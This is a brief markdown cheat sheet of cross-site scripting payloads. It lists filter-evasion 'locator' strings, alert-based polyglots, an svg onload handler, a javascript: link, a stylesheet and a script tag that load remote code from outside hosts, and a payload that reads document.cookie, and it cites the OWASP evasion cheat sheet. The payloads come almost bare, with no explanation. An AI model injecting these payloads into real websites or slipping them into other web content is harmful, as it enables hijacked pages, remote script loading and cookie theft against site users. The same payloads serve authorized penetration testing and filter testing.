# xss
### xss locator
```
"';!--"<XSS>=&{()}
```

```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```
```
<script>var q="";alert(1)//"</script>
```
```
<a href="javascript:alert(1)">Link</a>
```
```
<svg onload=alert(1)>
```

### expoits
```
<link rel=stylesheet href=//attacker/test.css>
```
```
<script src=http://peniscorp.com/topkek.js>
```

```
<script>alert(document.cookie)</script>
```

### references
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
